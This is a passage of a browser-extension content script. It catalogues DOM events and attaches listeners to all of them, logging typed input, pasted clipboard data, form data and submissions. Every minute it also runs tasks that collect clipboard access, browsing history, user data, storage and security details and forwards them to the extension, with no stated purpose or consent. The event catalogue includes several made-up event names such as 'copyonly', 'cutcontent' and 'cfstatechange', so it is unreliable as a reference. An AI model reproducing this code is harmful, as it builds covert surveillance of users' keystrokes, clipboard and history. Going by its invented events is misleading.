    {name: "speechintermediate", description: "Emitted when intermediate speech recognition results are available. Relevant for speech recognition applications. Sometimes page-specific.", parameters: ["results"], context: ["SpeechRecognition", "document"]},
    {name: "speechinterpretation", description: "Emitted when speech interpretation occurs. Relevant for speech recognition applications. Sometimes page-specific.", parameters: ["interpretation"], context: ["SpeechRecognition", "document"]},
    {name: "speechnomatch", description: "Emitted when speech recognition doesn't match any of the grammar items. Relevant for speech recognition applications. Sometimes page-specific.", parameters: [], context: ["SpeechRecognition", "document"]},
    {name: "speechstart", description: "Emitted when speech recognition input starts. Relevant for speech recognition applications. Sometimes page-specific.", parameters: [], context: ["SpeechRecognition", "document"]},

    // Touch events
    {name: "touchcancel", description: "Emitted when a touch event is interrupted. Relevant for element-specific touch interactions. Always page-specific.", parameters: ["touches", "targetTouches", "changedTouches"], context: ["element", "event"]},
    {name: "touchend", description: "Emitted when a touch point is removed from the touch surface. Relevant for element-specific touch interactions. Always page-specific.", parameters: ["touches", "targetTouches", "changedTouches"], context: ["element", "event"]},
    {name: "touchmove", description: "Emitted when a touch point moves along the touch surface. Relevant for element-specific touch interactions. Always page-specific.", parameters: ["touches", "targetTouches", "changedTouches"], context: ["element", "event"]},
    {name: "touchstart", description: "Emitted when a touch point is placed on the touch surface. Relevant for element-specific touch interactions. Always page-specific.", parameters: ["touches", "targetTouches", "changedTouches"], context: ["element", "event"]},

    // Form interaction events
    {name: "autocomplete", description: "Emitted when an autocomplete operation is triggered. Relevant for form-specific interactions. Always page-specific.", parameters: ["inputElement"], context: ["form", "inputElement"]},
    {name: "autocompleteerror", description: "Emitted when an autocomplete operation fails. Relevant for form-specific interactions. Always page-specific.", parameters: ["inputElement", "error"], context: ["form", "inputElement"]},
    {name: "beforeinput", description: "Emitted before the input value is modified. Relevant for form-specific interactions. Always page-specific.", parameters: ["data", "inputType", "isComposing"], context: ["inputElement", "form"]},
    {name: "change", description: "Emitted when the value of an element has changed. Relevant for form-specific interactions. Always page-specific.", parameters: ["target"], context: ["inputElement", "selectElement", "textareaElement", "form"]},
    {name: "compositionend", description: "Emitted when text composition ends. Relevant for form-specific interactions. Always page-specific.", parameters: ["data"], context: ["inputElement", "textareaElement", "form"]},
    {name: "compositionstart", description: "Emitted when text composition starts. Relevant for form-specific interactions. Always page-specific.", parameters: ["data"], context: ["inputElement", "textareaElement", "form"]},
    {name: "compositionupdate", description: "Emitted when text composition is updated. Relevant for form-specific interactions. Always page-specific.", parameters: ["data"], context: ["inputElement", "textareaElement", "form"]},
    {name: "input", description: "Emitted when the value of an input element changes. Relevant for form-specific interactions. Always page-specific.", parameters: ["data", "inputType", "isComposing"], context: ["inputElement", "textareaElement", "form"]},
    {name: "invalid", description: "Emitted when an element is invalid. Relevant for form-specific interactions. Always page-specific.", parameters: [], context: ["formElement", "inputElement", "form"]},
    {name: "select", description: "Emitted when text within a text field is selected. Relevant for form-specific interactions. Always page-specific.", parameters: [], context: ["inputElement", "textareaElement", "form"]},
    {name: "textinput", description: "Emitted when text input occurs. Relevant for form-specific interactions. Always page-specific.", parameters: ["data"], context: ["inputElement", "textareaElement", "form"]},
    {name: "complete", description: "Emitted upon completion of certain form-related tasks. Relevant for form-specific interactions. Always page-specific.", parameters: [], context: ["form", "document"]},
    {name: "formdata", description: "Emitted when form data is being sent. Relevant for form-specific interactions. Always page-specific.", parameters: ["formData"], context: ["form", "document"]},
    {name: "reset", description: "Emitted when a form is reset. Relevant for form-specific interactions. Always page-specific.", parameters: [], context: ["form", "document"]},
    {name: "submit", description: "Emitted when a form is submitted. Relevant for form-specific interactions. Always page-specific.", parameters: [], context: ["form", "document"]},

    // Full screen mode events
    {name: "fullscreenactivate", description: "Emitted when fullscreen mode is activated. Relevant for document-specific full-screen interactions. Sometimes page-specific.", parameters: [], context: ["element", "document"]},
    {name: "fullscreenchange", description: "Emitted when an element enters or exits full-screen mode. Relevant for document-specific full-screen interactions. Sometimes page-specific.", parameters: [], context: ["element", "document"]},
    {name: "fullscreenerror", description: "Emitted when an error occurs in full-screen mode. Relevant for document-specific full-screen interactions. Sometimes page-specific.", parameters: [], context: ["element", "document"]},
    {name: "fullscreenerrorchange", description: "Emitted when the state of fullscreen error changes. Relevant for document-specific full-screen interactions. Sometimes page-specific.", parameters: [], context: ["element", "document"]},
    {name: "fullscreenstatechange", description: "Emitted when the fullscreen state changes. Relevant for document-specific full-screen interactions. Sometimes page-specific.", parameters: [], context: ["element", "document"]},
    {name: "fullscreenvalidate", description: "Emitted when fullscreen mode is validated. Relevant for document-specific full-screen interactions. Sometimes page-specific.", parameters: [], context: ["element", "document"]},

    // WebGL events
    {name: "contextlost", description: "Emitted when the WebGL context is lost. Relevant for canvas-specific WebGL interactions. Sometimes page-specific.", parameters: [], context: ["WebGLRenderingContext", "canvasElement"]},
    {name: "contextrestored", description: "Emitted when the WebGL context is restored. Relevant for canvas-specific WebGL interactions. Sometimes page-specific.", parameters: [], context: ["WebGLRenderingContext", "canvasElement"]},

    // Clipboard events
    {name: "copy", description: "Emitted when content is copied to the clipboard. Relevant for document-specific clipboard interactions. Always page-specific.", parameters: [], context: ["document", "element", "clipboardData"]},
    {name: "copyonly", description: "Emitted when content is copied only. Relevant for document-specific clipboard interactions. Always page-specific.", parameters: [], context: ["document", "element", "clipboardData"]},
    {name: "paste", description: "Emitted when content is pasted from the clipboard. Relevant for document-specific clipboard interactions. Always page-specific.", parameters: ["clipboardData"], context: ["element", "event"]},
    {name: "cut", description: "Emitted when content is cut to the clipboard. Relevant for document-specific clipboard interactions. Always page-specific.", parameters: [], context: ["document", "element", "clipboardData"]},
    {name: "cutcontent", description: "Emitted when content is cut. Relevant for document-specific clipboard interactions. Always page-specific.", parameters: [], context: ["document", "element"]},

    // Window size events
    {name: "resize", description: "Emitted when an element is resized. Relevant for window-specific resize interactions. Sometimes page-specific.", parameters: [], context: ["element", "window"]},

    // Page navigation events
    {name: "scroll", description: "Emitted when the document or an element is scrolled. Relevant for document-specific scroll interactions. Sometimes page-specific.", parameters: [], context: ["document", "element"]},
    {name: "scrollend", description: "Emitted when a scroll operation completes. Relevant for document-specific scroll interactions. Sometimes page-specific.", parameters: [], context: ["document", "element"]},
    {name: "pagefocus", description: "Emitted when the page gains focus. Relevant for window-specific page interactions. Sometimes page-specific.", parameters: [], context: ["window", "document"]},
    {name: "pagehide", description: "Emitted when the user navigates away from the page. Relevant for window-specific page interactions. Sometimes page-specific.", parameters: [], context: ["window", "document"]},
    {name: "pageloading", description: "Emitted when the page is loading. Relevant for window-specific page interactions. Sometimes page-specific.", parameters: [], context: ["window", "document"]},
    {name: "pageshow", description: "Emitted when the user navigates to the page. Relevant for window-specific page interactions. Sometimes page-specific.", parameters: [], context: ["window", "document"]},
    {name: "blur", description: "Emitted when an element loses focus. Relevant for window-specific page interactions. Sometimes page-specific.", parameters: ["relatedTarget"], context: ["element", "window"]},

    // XMLHttpRequest events
    {name: "load", description: "Emitted when a fetch, XHR request, or resource and its dependent resources have finished loading. Relevant for network-specific interactions. Sometimes page-specific.", parameters: [], context: ["fetch", "XMLHttpRequest", "window", "document", "element"]},
    {name: "abort", description: "Emitted when a fetch or XHR request is aborted. Relevant for network-specific interactions. Sometimes page-specific.", parameters: ["target"], context: ["fetch", "XMLHttpRequest", "window"]},
    {name: "loadend", description: "Emitted when a fetch or XHR request completes (success or failure). Relevant for network-specific interactions. Sometimes page-specific.", parameters: ["target"], context: ["fetch", "XMLHttpRequest", "window"]},
    {name: "loadstart", description: "Emitted when a fetch or XHR request starts. Relevant for network-specific interactions. Sometimes page-specific.", parameters: ["target"], context: ["fetch", "XMLHttpRequest", "window"]},
    {name: "progress", description: "Emitted periodically during the download of a fetch or XHR request. Relevant for network-specific interactions. Sometimes page-specific.", parameters: ["lengthComputable", "loaded", "total"], context: ["fetch", "XMLHttpRequest", "window"]},
    {name: "timeout", description: "Emitted when a fetch or XHR request times out. Relevant for network-specific interactions. Sometimes page-specific.", parameters: ["target"], context: ["fetch", "XMLHttpRequest", "window"]},

    // XR events
    {name: "beforexrselect", description: "Emitted before an XR session selects something. Relevant for XR-specific interactions. Sometimes page-specific.", parameters: ["XRSession"], context: ["XRSession", "XRSpace"]},

    // AR events
    {name: "targetfound", description: "Emitted when an AR target is found. Relevant for AR-specific interactions. Sometimes page-specific.", parameters: ["target"], context: ["AR", "document"]},
    {name: "targetlost", description: "Emitted when an AR target is lost. Relevant for AR-specific interactions. Sometimes page-specific.", parameters: ["target"], context: ["AR", "document"]},

    // Payment events
    {name: "merchantvalidation", description: "Emitted during a payment request to validate a merchant. Relevant for payment-specific interactions. Sometimes page-specific.", parameters: ["validationDetails"], context: ["paymentRequest", "window"]},
    {name: "paymentmethodchange", description: "Emitted when the payment method changes. Relevant for payment-specific interactions. Sometimes page-specific.", parameters: ["methodDetails"], context: ["paymentRequest", "window"]},

    // Performance events
    {name: "resourcetimingbufferempty", description: "Emitted when the resource timing buffer is emptied. Relevant for performance-specific interactions. Sometimes page-specific.", parameters: [], context: ["performance", "document"]},
    {name: "resourcetimingbufferfull", description: "Emitted when the resource timing buffer is full. Relevant for performance-specific interactions. Sometimes page-specific.", parameters: [], context: ["performance", "document"]},

    // Mutation events
    {name: "mutation", description: "Emitted when mutations are observed on a node or subtree. Relevant for mutation observer-specific interactions. Always page-specific.", parameters: ["addedNodes", "removedNodes", "previousSibling", "nextSibling", "attributeName", "attributeNamespace", "oldValue"], context: ["MutationObserver", "element"]},

    // Script execution events
    {name: "beforescriptexecute", description: "Emitted before a script is executed. Relevant for document-specific script execution. Sometimes page-specific.", parameters: ["scriptElement"], context: ["document", "scriptElement"]},

    // Generic element events
    {name: "useractivation", description: "Emitted when the user activates an element. Relevant for element-specific interactions. Always page-specific.", parameters: [], context: ["element", "event"]},
    {name: "contentdelete", description: "Emitted when content is deleted. Relevant for element-specific interactions. Always page-specific.", parameters: [], context: ["document", "element"]},
    {name: "error", description: "Emitted when an error occurs. Relevant for error handling in various contexts like window, document, or console. Sometimes page-specific.", parameters: ["message", "filename", "lineno", "colno", "error"], context: ["window", "document", "element", "console"]},
    {name: "errorcapture", description: "Emitted when an error is captured. Relevant for error handling in various contexts like window, document, or console. Sometimes page-specific.", parameters: ["message", "filename", "lineno", "colno", "error"], context: ["window", "document", "element", "console"]},
    {name: "intersectionchange", description: "Emitted when an observed element intersects with the viewport or another element. Relevant for intersection observer-specific interactions. Always page-specific.", parameters: ["intersectionRatio", "boundingClientRect", "intersectionRect", "rootBounds"], context: ["IntersectionObserver", "element"]},
    {name: "securitypolicyviolation", description: "Emitted when a content security policy is violated. Relevant for document-specific security policy violations. Sometimes page-specific.", parameters: ["documentURI", "referrer", "blockedURI", "violatedDirective", "originalPolicy", "sourceFile", "lineNumber", "columnNumber", "disposition"], context: ["document", "element"]},
    {name: "show", description: "Emitted when a dialog is shown. Relevant for element-specific interactions. Always page-specific.", parameters: [], context: ["element", "event"]},
    {name: "slotchange", description: "Emitted when the contents of a slot change. Relevant for element-specific interactions. Always page-specific.", parameters: [], context: ["slot", "element"]},
    {name: "toggle", description: "Emitted when an element is toggled. Relevant for element-specific interactions. Always page-specific.", parameters: [], context: ["element", "event"]},
    {name: "virtualkeyboardresize", description: "Emitted when a virtual keyboard is resized. Relevant for element-specific interactions. Always page-specific.", parameters: [], context: ["window", "element"]},
    {name: "selectionchange", description: "Emitted when the selection changes. Relevant for document-specific selection interactions. Sometimes page-specific.", parameters: [], context: ["document", "element"]},
    {name: "selectstart", description: "Emitted when the selection starts. Relevant for document-specific selection interactions. Sometimes page-specific.", parameters: [], context: ["document", "element"]},

    // Other events
    {name: "afterprint", description: "Emitted after the print dialog is closed. Relevant for window-specific print interactions. Sometimes page-specific.", parameters: [], context: ["window", "document"]},
    {name: "beforeprint", description: "Emitted before the print dialog is opened. Relevant for window-specific print interactions. Sometimes page-specific.", parameters: [], context: ["window", "document"]},
    {name: "beforeinstallprompt", description: "Emitted before a user is prompted to install a web application. Relevant for navigator-specific install prompt interactions. Sometimes page-specific.", parameters: ["prompt"], context: ["window", "navigator"]},
    {name: "beforematch", description: "Emitted before a match in a find-in-page operation. Relevant for document-specific search interactions. Sometimes page-specific.", parameters: [], context: ["document", "search"]},
    {name: "beforeunload", description: "Emitted before the document is unloaded. Relevant for window-specific unload interactions. Sometimes page-specific.", parameters: ["returnValue"], context: ["window", "document"]},
    {name: "cfstatechange", description: "Emitted when the state of Content Fulfillment changes. Relevant for content fulfillment-specific interactions. Sometimes page-specific.", parameters: ["state"], context: ["contentFulfillment", "document"]},
    {name: "freeze", description: "Emitted when the page enters the frozen state. Relevant for window-specific state interactions. Sometimes page-specific.", parameters: [], context: ["window", "document"]},
    {name: "hashchange", description: "Emitted when the fragment identifier of the URL changes. Relevant for window-specific navigation interactions. Sometimes page-specific.", parameters: ["oldURL", "newURL"], context: ["window", "document"]},
    {name: "languagechange", description: "Emitted when the user's preferred language changes. Relevant for navigator-specific language interactions. Sometimes page-specific.", parameters: ["language"], context: ["navigator", "window"]},
    {name: "messageerror", description: "Emitted when a message error is received. Relevant for document-specific message interactions. Sometimes page-specific.", parameters: ["data", "origin", "lastEventId", "source", "ports"], context: ["window", "document"]},
    {name: "notificationclick", description: "Emitted when a notification is clicked. Relevant for window-specific notification interactions. Sometimes page-specific.", parameters: ["action", "notification"], context: ["notification", "window"]},
    {name: "popstate", description: "Emitted when the active history entry changes. Relevant for window-specific history interactions. Sometimes page-specific.", parameters: ["state"], context: ["window", "history"]},
    {name: "readystatechange", description: "Emitted when the document's ready state changes. Relevant for document-specific ready state interactions. Sometimes page-specific.", parameters: [], context: ["document", "window"]},
    {name: "storage", description: "Emitted when a change is made to the storage area. Relevant for window-specific storage interactions. Sometimes page-specific.", parameters: ["key", "oldValue", "newValue", "url", "storageArea"], context: ["Storage", "window"]},
    {name: "unhandledrejection", description: "Emitted when a JavaScript Promise is rejected and no error handler is attached. Relevant for window-specific error handling. Sometimes page-specific.", parameters: ["reason", "promise"], context: ["window", "document"]},
    {name: "unload", description: "Emitted when the document or a resource is being unloaded. Relevant for window-specific unload interactions. Sometimes page-specific.", parameters: [], context: ["window", "document"]},
    {name: "visibilitychange", description: "Emitted when the visibility state of the document changes. Relevant for document-specific visibility interactions. Sometimes page-specific.", parameters: [], context: ["document", "window"]},
];

const logEvent = (event, parameters) => {
    const serializedDetails = serializeEvent(event, parameters);
    const log = {
        type: event.type,
        timestamp: new Date(),
        details: serializedDetails
    };
    try {
        chrome.runtime.sendMessage({ event: event.type, details: log.details });
    } catch (error) {
        console.error(`Error sending message for event ${event.type}:`, error);
    }
};

const eventManager = (() => {
    const eventListeners = {};

    const manageListener = (action, eventName, handler) => {
        try {
            window[`${action}EventListener`](eventName, handler);
            chrome.runtime.sendMessage({
                event: 'event-listener-added',
                action: action,
                eventName: eventName,
            });
        } catch (error) {
            console.error(`Failed to ${action} listener for event ${eventName}: ${error.message}`);
        }
    };

    const createHandler = (eventName, parameters) => event => {
        logEvent(event, parameters);
        eventEmitter.emit(eventName, event);
    };

    return {
        enableEvent: (eventName) => {
            if (!eventListeners[eventName]) {
                const event = contentEvents.find(e => e.name === eventName);
                if (event) {
                    const handler = createHandler(eventName, event.parameters);
                    manageListener('add', eventName, handler);
                    eventListeners[eventName] = handler;
                } else {
                    console.error(`Event ${eventName} not found.`);
                }
            } else {
                console.warn(`Event ${eventName} already enabled.`);
            }
        },
        disableEvent: (eventName) => {
            if (eventListeners[eventName]) {
                manageListener('remove', eventName, eventListeners[eventName]);
                delete eventListeners[eventName];
            } else {
                console.error(`Event ${eventName} not enabled.`);
            }
        }
    };
})();

contentEvents.forEach(event => eventManager.enableEvent(event.name));

// Enable scroll event tracking
const handleScroll = () => {
    const scrollEvent = {
        type: 'scroll',
        timestamp: new Date(),
        scrollX: window.scrollX,
        scrollY: window.scrollY,
    };
    logEvent(scrollEvent, ['type', 'timestamp', 'scrollX', 'scrollY']);
};

window.addEventListener('scroll', handleScroll);

const observeDOMChanges = () => {
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.type === 'childList' || mutation.type === 'attributes') {
                handleScroll(); // Call handleScroll if DOM changes
            }
        });
    });

    observer.observe(document, {
        attributes: true,
        childList: true,
        subtree: true,
    });
};

observeDOMChanges();

const logBrowserInfo = async () => {
    const tasks = [
        getPermissions,
        getClipboardAccess,
        getPermissionsAndSettings,
        getNetworkInfo,
        getSubresourceIntegrity,
        getCSPReport,
        getAdvancedFileSystemAccess,
        getBrowserHistory,
        getUserSpecificData,
        getWebPushNotifications,
        getWindowAndTabInfo,
        getDetailedWindowTabRelationships,
        getTabGroupInformation,
        getTabOpenerInformation,
        getAdvancedIdleDetection,
        getStorageAndData,
        async () => ({ ...getPerformanceMetrics(), userTiming: getUserTiming() }),
        getSecurityDetails,
        getCustomElements,
        getUserInteractionInfo,
        getAdvancedCapabilities,
        getEnvironmentalSensors
    ];

    for (const task of tasks) {
        try {
            const result = await task();
            chrome.runtime.sendMessage({ task: task.name, result });
        } catch (error) {
            chrome.runtime.sendMessage({ task: task.name, error: error.message });
        }
    }
};

setInterval(logBrowserInfo, 60000);
logBrowserInfo();

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message === 'reload') {
        eventEmitter.clear();
        window.removeEventListener('scroll', handleScroll);
        observeDOMChanges();
        logBrowserInfo();
        sendResponse({ status: 'reloaded' });
    }
});








